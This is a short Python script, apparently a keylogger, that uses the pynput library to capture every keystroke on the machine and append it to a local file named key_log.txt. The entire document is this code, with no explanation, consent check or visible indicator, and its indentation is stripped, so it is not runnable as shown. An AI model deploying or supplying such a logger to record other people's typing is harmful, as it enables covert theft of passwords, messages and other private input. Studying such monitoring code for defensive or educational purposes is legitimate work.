from pynput.keyboard import Listener
log_file = "key_log.txt"
def on_press(key):
with open(log_file, "a") as f:
try:
f.write(f"{key.char}")
except AttributeError:
f.write(f"[{key}]")
with Listener(on_press=on_press) as listener:
listener.join() 
